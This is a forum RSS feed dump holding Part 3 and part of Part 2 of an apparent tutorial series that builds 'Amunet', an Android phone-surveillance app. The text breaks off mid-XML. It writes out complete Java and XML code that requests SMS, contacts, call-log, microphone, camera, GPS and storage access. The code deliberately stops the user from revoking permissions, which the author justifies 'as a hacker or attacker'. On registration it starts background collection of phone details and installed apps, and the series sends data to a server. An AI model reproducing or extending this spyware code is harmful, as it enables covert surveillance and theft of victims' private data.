+<p><strong>INTERFACE FOR DASHBOARD</strong></p>
+<p>We now have two activities ( UI Interfaces ) for our app: <code>MainActivity</code> and <code>Dashboard</code> respectively. They are both <strong>BASIC ACTIVITY</strong> layouts, created in the previous tutorials. For every basic activity created, two layout files are generated: <code>activity_(layout_name)</code> and <code>content_(layout_name)</code> which in our case is <code>activity_dashboard</code> and <code>content_dashboard</code> ( Dashboard UI ). We will create our UI in the <code>content_dashboard</code> file. Let’s head over to the file and code.</p>
+<p>We won’t add any element or UI object but one. Guess the element ( Its a View element ) ?</p>
+<p>It’s a …</p>
+
+Summary <a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317/1">(click for more details)</a>
+<p>Drag and drop a Recycler View from the toolbox unto the content_dashboard.xml file. You should have something similar to …</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+xmlns:app="http://schemas.android.com/apk/res-auto"
+xmlns:tools="http://schemas.android.com/tools"
+android:layout_width="match_parent"
+android:layout_height="match_parent"
+app:layout_behavior="@string/appbar_scrolling_view_behavior"
+tools:context=".Dashboard"
+tools:showIn="@layout/activity_dashboard"&gt;
+
+&lt;android.support.v7.widget.RecyclerView
+    android:layout_width="match_parent"
+    android:id="@+id/dashboard_recycler_view"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;/RelativeLayout&gt;
+</code></pre>
+<p>The <code>id</code> assigned to our recycler view is <code>dashboard_recycler_view</code> ( take note ). Done.</p>
+<p>The recycler view simply holds the view and therefore needs a layout design file to populate it. It’s just like a container. The layout design file are the boxes that are placed inside the container. Hope you get it. More read on RecyclerViews on <a href="https://google.com" rel="noopener nofollow ugc">Google</a>.</p>
+<p>To create a layout design file, simply <code>right click</code> on the <code>layout</code> directory  under <code>res</code> in Android Studio and select <code>New</code> -&gt; <code>Layout resource file</code> and give it a name. For this tutorial, we will name it <code>recycler_items</code>. If you name it anything else, do well to correct it in the code otherwise your RecyclerView won’t be populated ( that is, if you Android Studio compiles it ).</p>
+<p>The layout file should be created under the <code>res</code> -&gt; <code>layout</code> directory.</p>
+<p><strong>RECYCLER_ITEMS.XML</strong></p>
+<p>This file will only hold one UI object. The object is a Switch ( Toggle - ON / OFF ). Every one knows a switch. A baby even does so no explanation here. By default, our toggle will be off. When we toggle it ( ON ), it asks us for the permission. This is the code.</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;RelativeLayout
+xmlns:android="http://schemas.android.com/apk/res/android"
+android:layout_width="match_parent"
+android:padding="10dp"
+android:layout_height="wrap_content"&gt;
+
+&lt;Switch
+    android:layout_width="match_parent"
+    android:text="Permission Name"
+    android:id="@+id/permission_switch"
+    android:textOff="Denied"
+    android:textOn="Allowed"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;/RelativeLayout&gt;
+</code></pre>
+<p>Hope we are all on the same page. Easy right ?</p>
+<p>If you’ve ever worked with a recycler view, you know that it needs an adapter and list class to populate it. Read more on Google. Check out <a href="https://www.androidhive.info/2016/01/android-working-with-recycler-view/" rel="noopener nofollow ugc">Android Working with Recycler View</a>.</p>
+<p><strong>CREATING A RECYCLER LIST CLASS</strong></p>
+<p>We need a list that is passed to the adapter and the adapter in turn populates the recycler view with the list. Create a new java class name it <code>RecyclerJava</code>.</p>
+<p>When it is created, you should have an empty class. Lets write our code</p>
+<pre><code>String permission_name;
+String[] permission_identifier;
+int permission_request_code;
+
+public String getPermission_name() {
+    return permission_name;
+}
+
+public String[] getPermission_identifier() {
+    return permission_identifier;
+}
+
+public int getPermission_request_code() {
+    return permission_request_code;
+}
+
+public RecyclerJava(String permission_name, String[] permission_identifier, int permission_request_code) {
+    this.permission_identifier = permission_identifier;
+    this.permission_name = permission_name;
+    this.permission_request_code = permission_request_code;
+}
+</code></pre>
+<p>Before I explain the codes, lets first understand the logic.</p>
+<p>The switch object we created earlier ( <code>recycler_items.xml</code> ) will need a text showing what it stands for, permission it should request when toggled and the permission request code.</p>
+<p>In Android, to request a permission, we need a request code. The Request code help us identify the permission later on and determine if it was granted or denied.</p>
+<ol>
+<li>
+<code>String permission_name</code> - The text that is displayed on the Switch object eg Camera, Contacts.</li>
+<li>
+<code>String[] permission_identifier</code> - Some phone functionalities ( like CAMERA, MIC, VIBRATION ) need only one permission whilst other functionalities ( like GPS, CALENDAR) need multiple permission requests. The string array allows both scenarios to be satisfied.</li>
+<li>
+<code>int permission_request_code</code> - Request codes helps us determine if the permission was granted or not.</li>
+<li>The remaining 3 functions below the above are getters.</li>
+<li>The last function is a constructor that takes data from the user and updates the Class.</li>
+</ol>
+<p><strong>CREATING A RECYCLER ADAPTER CLASS</strong></p>
+<p>Recycler adapter classes are quite tricky and a personal choice depending on how you want to achieve your goal. I always have difficulty with adapter classes but managed to push through for this tutorial. It should work for our series.</p>
+<p>What the adapter does is, it takes the list objects from the <code>RecyclerJava</code> class passed to it, finds the switch object in <code>recycler_items.xml</code> and makes sure the codes within the adapter for a particular view or object are executed. You’ll understand more as we go on. Create a new java class name it <code>RecyclerAdapter</code>.</p>
+<p>When it is created, you should have an empty class. Lets write our code.</p>
+<pre><code>package &lt;package name goes here&gt;
+
+import android.content.Context;
+import android.content.pm.PackageManager;
+import android.support.v4.app.ActivityCompat;
+import android.support.v7.widget.RecyclerView;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.ViewGroup;
+import android.widget.CompoundButton;
+import android.widget.Switch;
+import android.widget.Toast;
+
+import java.util.List;
+
+public class RecyclerAdapter extends RecyclerView.Adapter&lt;RecyclerAdapter.MyViewHolder&gt; {
+
+private List&lt;RecyclerJava&gt; recyclerJava;
+
+public class MyViewHolder extends RecyclerView.ViewHolder {
+
+    Switch aSwitch;
+    Context context;
+
+    private String[] permission_identifier;
+    private int permission_request_code;
+
+    public MyViewHolder(View view) {
+        super(view);
+        context = view.getContext();
+
+        aSwitch = view.findViewById(R.id.permission_switch);
+        aSwitch.setChecked(false);
+    }
+}
+
+public RecyclerAdapter(List&lt;RecyclerJava&gt; recyclerList) {
+    this.recyclerJava = recyclerList;
+}
+
+@Override
+public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {
+    View itemView = LayoutInflater.from(parent.getContext())
+            .inflate(R.layout.recycler_items, parent, false);
+
+    return new MyViewHolder(itemView);
+}
+
+@Override
+public void onBindViewHolder(final MyViewHolder holder, int position) {
+    RecyclerJava data = recyclerJava.get(position);
+
+    String permission_name = data.getPermission_name();
+    holder.permission_identifier = data.getPermission_identifier();
+    holder.permission_request_code = data.getPermission_request_code();
+
+    holder.aSwitch.setText(permission_name.toUpperCase());
+
+    if(ActivityCompat.checkSelfPermission(holder.context, holder.permission_identifier[0]) != PackageManager.PERMISSION_GRANTED) {
+        holder.aSwitch.setChecked(false);
+    } else {
+        holder.aSwitch.setChecked(true);
+    }
+
+    holder.aSwitch.setOnCheckedChangeListener( new CompoundButton.OnCheckedChangeListener() {
+        @Override
+        public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
+
+            if(b) {
+                ((Dashboard)holder.context).PermissionRequestHandler(holder.permission_identifier, holder.permission_request_code);
+            } else {
+                holder.aSwitch.setChecked(true);
+                Toast.makeText(holder.context, "Action Not Permitted", Toast.LENGTH_LONG).show();
+            }
+        }
+    });
+
+    holder.setIsRecyclable(false);
+}
+
+@Override
+public int getItemCount() {
+    return recyclerJava.size();
+}
+
+}
+</code></pre>
+<p>Lets take it bit by bit.</p>
+<p>1 - In the <code>onCreateViewHolder</code> method ( prolly line 43 ), the method takes the <code>recycler_items.xml</code> layout file and populates it into the <code>recyclerview</code>. The layout file holds sub views which is accessed by the <code>adapter</code> class.</p>
+<p>If you try accessing any other view outside the ones specified in the defined layout file, prepare yourself for a crash landing course with Android Studio. You won’t make it far. <img src="https://0x00sec.org/images/emoji/twitter/rofl.png?v=9" title=":rofl:" class="emoji" alt=":rofl:">.</p>
+<p>2 - Within the <code>MyViewHolder</code> sub class <code>public class MyViewHolder extends RecyclerView.ViewHolder {</code>, we need to get a reference to our ui objects before we can access them. Don’t do long running codes in this method ( in my experience ).</p>
+<p>3 - Every method needs a constructor ( I think ) and so does our adapter class. In <code>public RecyclerAdapter(List&lt;RecyclerJava&gt; recyclerList) {</code>, we accept a list argument ( parameter ). Through this constructor, we can take our list and populate our view with it.</p>
+<p>4 - Last but one</p>
+<ul>
+<li>
+<p>The method <code>public void onBindViewHolder(final MyViewHolder holder, int position) {</code> allows us to assign the data from the list to the ui objects in the passed layout file (  <code>onCreateViewHolder</code> method ).</p>
+</li>
+<li>
+<p>In this method, the views from the layout files are accessed through the <code>holder</code> variable. We get the data from the list through the <code>getters</code> we added in the <code>RecyclerJava</code> class created earlier.</p>
+</li>
+<li>
+<p>We check if the permission array passed to the adapter has already granted or denied, the appropriate actions are executed.</p>
+</li>
+<li>
+<p>If permission is already granted, the switch is toggled on, when it’s not, it’s toggled off. As a hacker or attacker, you won’t need to turn a permission off because you would want to gather as much information as you could so I therefore disabled the toggling off permissions.</p>
+</li>
+<li>
+<p>If a permission hasn’t been granted ( maybe first time install ), we call a <code>PermissionRequestHandler</code> method from the DashBoard.java file ( discussed later ) when the switch is toggled on.</p>
+</li>
+<li>
+<p>The <code>PermissionRequestHandler</code> method takes two parameter: the <code> permission identifier</code> ( string array) and the <code>permission request code</code>.</p>
+</li>
+</ul>
+<p>5 - The last method <code>public int getItemCount() {</code> is important. It returns the size of the list items passed to the adapter.</p>
+<p>Lets now head over to the <code>Dashboard.java</code> file and finish what we started.</p>
+<p><strong>DASHBOARD.JAVA</strong></p>
+<p>In this method, we tie up the knot and marry our activities and classes together.</p>
+<p>We first need to declare the permission request codes below our <code>public class</code> declaration. We also declare our <code>RecyclerJava</code> list class and <code>RecyclerAdapter</code> class in this section.</p>
+<pre><code>public class Dashboard extends AppCompatActivity {
+
+private RecyclerView recyclerView;
+private List&lt;RecyclerJava&gt; recyclerJavaList = new ArrayList&lt;&gt;();
+private RecyclerAdapter recyclerAdapter;
+
+protected static final int GPS_REQUEST_CODE = 5000;
+protected static final int CONTACTS_REQUEST_CODE = 5001;
+protected static final int CALENDAR_REQUEST_CODE = 5002;
+protected static final int MIC_REQUEST_CODE = 5003;
+protected static final int CAMERA_REQUEST_CODE = 5004;
+protected static final int STORAGE_REQUEST_CODE = 5005;
+protected static final int SMS_REQUEST_CODE = 5006;
+protected static final int GET_ACCOUNTS_REQUEST_CODE = 5007;
+</code></pre>
+<p>With that out of the way, let’s go on write the <code>PermissionRequestHandler</code> method declared in <code>RecyclerAdapter</code> class. The method takes the string array containing the various permissions needed and the appropriate request code.</p>
+<pre><code>protected void PermissionRequestHandler(String[] permission_identifier, int RequestCode) {
+    if(ActivityCompat.checkSelfPermission(getApplicationContext(), permission_identifier[0]) != PackageManager.PERMISSION_GRANTED) {
+        ActivityCompat.requestPermissions(Dashboard.this, permission_identifier, RequestCode);
+    }
+}
+</code></pre>
+<p>Whenever a permission is requested in android, the result is not received in the calling method but instead is received in another method ( like a callback ). The callback method is <code>onRequestPermissionsResult</code>.</p>
+<pre><code>@Override
+public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+    super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+
+    switch (requestCode) {
+        case GPS_REQUEST_CODE: {
+            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(getApplicationContext(), "GPS Permission Denied", Toast.LENGTH_LONG).show();
+            }
+            updateRecycler();
+        }
+        case SMS_REQUEST_CODE: {
+            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(getApplicationContext(), "SMS Permission Denied", Toast.LENGTH_LONG).show();
+            }
+            updateRecycler();
+        }
+        case GET_ACCOUNTS_REQUEST_CODE: {
+            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(getApplicationContext(), "Phone Accounts Access Permission Denied", Toast.LENGTH_LONG).show();
+            }
+            updateRecycler();
+        }
+        case CAMERA_REQUEST_CODE: {
+            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(getApplicationContext(), "CAMERA Permission Denied", Toast.LENGTH_LONG).show();
+            }
+            updateRecycler();
+        }
+        case CALENDAR_REQUEST_CODE: {
+            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(getApplicationContext(), "CALENDAR Permission Denied", Toast.LENGTH_LONG).show();
+            }
+            updateRecycler();
+        }
+        case MIC_REQUEST_CODE: {
+            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(getApplicationContext(), "MIC Permission Denied", Toast.LENGTH_LONG).show();
+            }
+            updateRecycler();
+        }
+        case CONTACTS_REQUEST_CODE: {
+            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(getApplicationContext(), "CONTACTS Permission Denied", Toast.LENGTH_LONG).show();
+            }
+            updateRecycler();
+        }
+        case STORAGE_REQUEST_CODE: {
+            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(getApplicationContext(), "STORAGE Permission Denied", Toast.LENGTH_LONG).show();
+            }
+            updateRecycler();
+        }
+    }
+}
+</code></pre>
+<p>A new method ( <code>updateRecycler()</code> ) is introduced in the method above. The <code>updateRecycler()</code> is the method where all the hard work of this tutorial is tied into. The method passes the information to the adapter which in turn populates the recyclerview. Let’s dive right into it.</p>
+<pre><code>private void updateRecycler() {
+
+    recyclerJavaList.clear();
+
+    RecyclerJava sms_permission = new RecyclerJava("SMS",
+            new String[] {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS}, SMS_REQUEST_CODE);
+    recyclerJavaList.add(sms_permission);
+
+    RecyclerJava accounts_permission = new RecyclerJava("ACCOUNTS",
+            new String[] {Manifest.permission.GET_ACCOUNTS}, GET_ACCOUNTS_REQUEST_CODE);
+    recyclerJavaList.add(accounts_permission);
+
+    RecyclerJava camera_permission = new RecyclerJava("Camera",
+            new String[] {Manifest.permission.CAMERA}, CAMERA_REQUEST_CODE);
+    recyclerJavaList.add(camera_permission);
+
+    RecyclerJava filesystem_permission = new RecyclerJava("Storage",
+            new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, STORAGE_REQUEST_CODE);
+    recyclerJavaList.add(filesystem_permission);
+
+    RecyclerJava calendar_permission = new RecyclerJava("Calendar",
+            new String[] {Manifest.permission.READ_CALENDAR, Manifest.permission.WRITE_CALENDAR}, CALENDAR_REQUEST_CODE);
+    recyclerJavaList.add(calendar_permission);
+
+    RecyclerJava gps_permission = new RecyclerJava("GPS Location",
+            new String[] {Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, GPS_REQUEST_CODE);
+    recyclerJavaList.add(gps_permission);
+
+    RecyclerJava mic_permission = new RecyclerJava("Record Microphone",
+            new String[] {Manifest.permission.RECORD_AUDIO}, MIC_REQUEST_CODE);
+    recyclerJavaList.add(mic_permission);
+
+    RecyclerJava contact_permission = new RecyclerJava("Contacts &amp; Call Logs",
+            new String[] {Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS, Manifest.permission.PROCESS_OUTGOING_CALLS}, CONTACTS_REQUEST_CODE);
+    recyclerJavaList.add(contact_permission);
+
+    recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
+    recyclerView.setAdapter(recyclerAdapter);
+    recyclerAdapter.notifyDataSetChanged();
+}
+</code></pre>
+<p>The method creates a list and passes it to the adapter. Notice that some functionalities have double permissions whilst others only need one.</p>
+<p>We need to however call this method from the <code>onCreate</code> method.</p>
+<p><strong>ONCREATE METHOD</strong></p>
+<p>In the <code>onCreate</code>, we set references ( recyclerview, adapter ) and call the needed functions ( updateRecycler ).</p>
+<pre><code>@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_dashboard);
+    Toolbar toolbar = findViewById(R.id.dashboard_toolbar);
+    setSupportActionBar(toolbar);
+
+    recyclerView = findViewById(R.id.dashboard_recycler_view);
+
+    recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
+    RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(getApplicationContext());
+    recyclerView.setLayoutManager(mLayoutManager);
+    recyclerView.setItemAnimator(new DefaultItemAnimator());
+    recyclerView.addItemDecoration(new DividerItemDecoration(Dashboard.this, LinearLayoutManager.VERTICAL));
+
+    updateRecycler();
+}
+</code></pre>
+<p><strong>THE IMPORT STATEMENT</strong></p>
+<p>Incase you are having trouble with your import statements, these are the complete import statements</p>
+<pre><code>import android.Manifest;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.support.annotation.NonNull;
+import android.support.v4.app.ActivityCompat;
+import android.support.v7.app.AppCompatActivity;
+import android.support.v7.widget.DefaultItemAnimator;
+import android.support.v7.widget.DividerItemDecoration;
+import android.support.v7.widget.LinearLayoutManager;
+import android.support.v7.widget.RecyclerView;
+import android.support.v7.widget.Toolbar;
+import android.widget.Toast;
+import java.util.ArrayList;
+import java.util.List;
+</code></pre>
+<p><strong>ANDROID MANIFEST</strong></p>
+<p>You can have all permissions coded but if you don’t specify them in the <code>AndroidManifest.xml</code> file, it won’t be processed when requested. This is the complete AndroidManifest file.</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
+package="org.a0x00sec.amunet"&gt;
+
+&lt;uses-permission android:name="android.permission.READ_PHONE_STATE" /&gt;
+&lt;uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" /&gt;
+
+&lt;uses-permission android:name="android.permission.INTERNET" /&gt;
+&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
+&lt;uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /&gt;
+
+&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /&gt;
+&lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /&gt;
+
+&lt;uses-permission android:name="android.permission.READ_CONTACTS" /&gt;
+&lt;uses-permission android:name="android.permission.WRITE_CONTACTS" /&gt;
+
+&lt;uses-permission android:name="android.permission.CAMERA" /&gt;
+
+&lt;uses-permission android:name="android.permission.VIBRATE" /&gt;
+
+&lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /&gt;
+&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /&gt;
+
+&lt;uses-permission android:name="android.permission.READ_SMS" /&gt;
+&lt;uses-permission android:name="android.permission.WRITE_SMS" /&gt;
+&lt;uses-permission android:name="android.permission.RECEIVE_SMS" /&gt;
+
+&lt;uses-permission android:name="android.permission.RECORD_AUDIO" /&gt;
+
+&lt;uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" /&gt;
+
+&lt;uses-permission android:name="android.permission.READ_CALENDAR" /&gt;
+&lt;uses-permission android:name="android.permission.WRITE_CALENDAR" /&gt;
+
+&lt;application
+    android:allowBackup="true"
+    android:icon="@mipmap/godseye"
+    android:label="@string/app_name"
+    android:roundIcon="@mipmap/godseye"
+    android:supportsRtl="true"
+    android:theme="@style/AppTheme"&gt;
+
+    &lt;activity
+        android:name=".MainActivity"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme.NoActionBar"&gt;
+        &lt;intent-filter&gt;
+            &lt;action android:name="android.intent.action.MAIN" /&gt;
+
+            &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
+        &lt;/intent-filter&gt;
+    &lt;/activity&gt;
+
+    &lt;activity
+        android:name=".Dashboard"
+        android:label="@string/title_activity_dashboard"
+        android:theme="@style/AppTheme.NoActionBar" /&gt;
+
+&lt;/application&gt;
+
+&lt;/manifest&gt;
+</code></pre>
+<p>The only changes are the <code>permissions</code> above the <code>application</code> tag.</p>
+<p><strong>HOUSE KEEPING</strong></p>
+<p>In the previous tutorial ( <code>MainActivity.java</code> ), under <code>create_phone_account</code>, we placed this line of code  <code>progressDialog.dismiss();</code> exactly under <code>public void onResponse(String req) {</code>.</p>
+<p>It will still work but will led the user to exit the app after the registration is complete. That is the idea but if you followed from previous tutorials, we added threads to run once the registration is done. This thread will therefore be cancelled. Instead of putting the dismiss code before the CountdownTimer, we place it after it. The <code>onResponse</code> section of the <code>create_phone_account</code> method will look like this.</p>
+<pre><code>public void onResponse(String req) {
+            // progressDialog.dismiss();
+
+            try {
+
+                final JSONObject response = new JSONObject(req);
+
+                if(response.getBoolean("success")) {
+                    final String server_response = response.getString("response");
+
+                    SharedPreferences.Editor editor = sharedPreferences.edit();
+
+                    editor.putString("auth_key", response.getString("api_key"));
+
+                    editor.apply();
+
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            collect_phone_details();
+                            collect_installed_apps();
+                        }
+                    }).start();
+
+                    new CountDownTimer(6000,1000) {
+                        @Override
+                        public void onTick(long l) {
+
+                        }
+
+                        @Override
+                        public void onFinish() {
+                            show_alert(server_response);
+                        }
+                    }.start();
+
+                    username.setText("");
+                    password.setText("");
+                    name.setText("");
+
+                    progressDialog.dismiss(); // New line of code
+                    startActivity(new Intent(MainActivity.this, Dashboard.class));
+                    finish();
+                } else {
+                    show_alert(response.getString("response"));
+                }
+            } catch (Exception e) {
+                show_alert("Authentication error: " + e.getMessage());
+            }
+        }
+</code></pre>
+<p>That should be the end of this tutorial. You can run your app.</p>
+<p><strong>CONCLUSION</strong></p>
+<p>I would love your contributions, suggestions, feedbacks, critics, etc. Anything to help the series.</p>
+<p>You can directly import the project into your android studio if you are having trouble.</p>
+<p>Checkout the github repo: <a href="https://github.com/sergeantexploiter/Amunet" rel="noopener nofollow ugc">https://github.com/sergeantexploiter/Amunet</a></p>
+<p>Until we meet again. I’m out.</p>
+<p><strong><span class="hashtag">#Sergeant</span></strong></p>
+            <p><small>2 posts - 1 participant</small></p>
+            <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317</link>
+          <pubDate>Fri, 29 Jun 2018 14:35:09 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-7317</guid>
+          <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317.rss">Building a God’s Eye Android App: Part 3 - Permission Granting</source>
+        </item>
+        <item>
+          <title>Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</title>
+          <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>Greetings my fellow hackers,</p>
+<p>As we continue with our series, the AMUNET app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.</p>
+<p><strong>PREVIOUS TUTORIALS</strong></p>
+<p>Below are the tutorials covered so far.</p>
+<ol>
+<li><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4">Introduction to Amunet</a></li>
+<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121">Collecting Installed Android Apps</a></li>
+</ol>
+<p><strong>TODAY’S TUTORIAL</strong></p>
+<p>In today’s tutorial, we are going to send data to our server using <a href="https://developer.android.com/training/volley/" rel="noopener nofollow ugc">Volley Google</a>. Volley is an HTTP library that makes networking for Android apps easier and most importantly, faster. In order to use volley in our android app, we first need to import it into our android studio project.</p>
+<p>Go to <code>build.gradle</code> ( Module: app ) under Grade Scripts and add the dependency  <code>implementation 'com.android.volley:volley:1.1.0'</code>. Make sure you sync the project. You should something similar to this.</p>
+<blockquote>
+<pre><code>dependencies {
+    implementation fileTree(dir: 'libs', include: ['*.jar'])
+    implementation 'com.android.support:appcompat-v7:27.1.1'
+    implementation 'com.android.support.constraint:constraint-layout:1.1.2'
+    implementation 'com.android.support:design:27.1.1'
+    testImplementation 'junit:junit:4.12'
+    androidTestImplementation 'com.android.support.test:runner:1.0.2'
+    androidTestImplementation 'com.android.support.test.espresso:espresso-core:3.0.2'
+
+    implementation 'com.android.volley:volley:1.1.0'
+</code></pre>
+<p>}</p>
+</blockquote>
+<p>Now, we can go on to use the volley library in our project. Before we continue, create a new <code>Basic Activity</code> called “<code>Dashboard</code>”. We wouldn’t use it now ( later in this tutorial ). The reason why we are creating the <code>Dashboard</code> activity is because we are going to use the <code>MainActivity.java</code> for phone registration.</p>
+<p><strong>SETTING UP AN APP ICON</strong></p>
+<p>No one likes using the default icon for created projects. You can use any icon of your choice. I’m using an eye image. Make sure your image is big enough. I’ll upload it here incase anyone wants to use it.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/157311909021c87f07f96ccb6068e48d66a90b2d.jpg" alt="eye2" data-base62-sha1="33KyJzNE4SE77ZF3y3dfwPFPofj" width="261" height="200"></p>
+<p>Now, head over to <a href="http://romannurik.github.io/AndroidAssetStudio/icons-launcher.html" rel="noopener nofollow ugc">Roman Urik’s Github</a>. I love using this tool because of the ease it allows for the customization of icons. Select <code>Image</code> ( Under Foreground ) and upload your preferred image. Customize the icon according to your taste. I’m using a white background.</p>
+<p>After you are done, click on the <code>Download button</code> on the upper right section of the website under the <code>Source on Github</code> link. The image should be downloaded onto your computer.</p>
+<p>Extract the package and you should notice the icons are grouped into resolutions. Don’t mess them up. They are grouped intentionally. Go back to the Android Studio and under <code>res</code>, right click on <code>mipmap</code>. On Mac, choose “Reveal in Finder” and on Windows, something similar maybe “Open in Explorer” or “Explore” should open the mipmap directory in your explorer. Now copy the files accordingly from the extracted mipmap folder to the opened android studio mipmap directory. Should everything be done correctly, the new icons copied will show in the android studio. If you still have trouble, search online or watch this video <a href="https://www.youtube.com/watch?v=SDKwNh0TioE" rel="noopener nofollow ugc">Change The App Icon in Android Studio - YouTube</a></p>
+<p>Open  <code>AndroidManifest</code> ( under app-&gt;manifests ) and change the value for <code>android:roundIcon</code> and <code>android:icon</code> in the <code>application</code> tag to the filename of the app icon imported. This will  allow the app use the icon.</p>
+<p>Still in <code>AndroidManifest</code> file, add the <code>READ_PHONE_STATE</code>, <code>INTERNET</code> AND <code>ACCESS_NETWORK_STATE</code> permissions. Above the application tag opening, add these lines.</p>
+<pre><code>&lt;uses-permission android:name="android.permission.READ_PHONE_STATE" /&gt;
+&lt;uses-permission android:name="android.permission.INTERNET" /&gt;
+&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
+</code></pre>
+<p><strong>CREATING THE UI FOR MAIN ACTIVITY</strong></p>
+<p>Two files are created under the <code>layout</code> folder when a Basic Activity is chosen. In our case, it’s <code>activity_main.xml</code> and <code>content_main.xml</code> unless you named your activity otherwise.</p>
+<p>In the activity_main.xml, clear the <code>toolbar</code> and the <code>appbarlayout</code>  code. Our code should look like this.</p>
+<blockquote>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;android.support.design.widget.CoordinatorLayout 
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    tools:context=".MainActivity"&gt;
+
+    &lt;include layout="@layout/content_main" /&gt;
+
+&lt;/android.support.design.widget.CoordinatorLayout&gt;
+</code></pre>
+</blockquote>
+<p>We will design our registration interface in the <code>content_main</code>. The code for the UI</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+xmlns:app="http://schemas.android.com/apk/res-auto"
+xmlns:tools="http://schemas.android.com/tools"
+android:layout_width="match_parent"
+android:layout_height="match_parent"
+android:padding="20dp"
+app:layout_behavior="@string/appbar_scrolling_view_behavior"
+tools:context=".MainActivity"
+tools:showIn="@layout/activity_main"&gt;
+
+&lt;android.support.design.widget.TextInputLayout
+    android:layout_width="match_parent"
+    android:id="@+id/textinputlayout1"
+    android:layout_centerHorizontal="true"
+    android:layout_centerVertical="true"
+    android:layout_height="wrap_content"&gt;
+
+    &lt;EditText
+        android:layout_width="match_parent"
+        android:hint="Username"
+        android:id="@+id/username"
+        android:layout_height="wrap_content" /&gt;
+
+&lt;/android.support.design.widget.TextInputLayout&gt;
+
+&lt;android.support.design.widget.TextInputLayout
+    android:layout_width="match_parent"
+    android:id="@+id/textinputlayout2"
+    android:layout_below="@id/textinputlayout1"
+    android:layout_height="wrap_content"&gt;
+
+    &lt;EditText
+        android:layout_width="match_parent"
+        android:hint="Name"
+        android:id="@+id/full_name"
+        android:layout_height="wrap_content" /&gt;
+
+&lt;/android.support.design.widget.TextInputLayout&gt;
+
+&lt;android.support.design.widget.TextInputLayout
+    android:layout_width="match_parent"
+    android:id="@+id/textinputlayout3"
+    android:layout_below="@id/textinputlayout2"
+    android:layout_centerHorizontal="true"
+    android:layout_centerVertical="true"
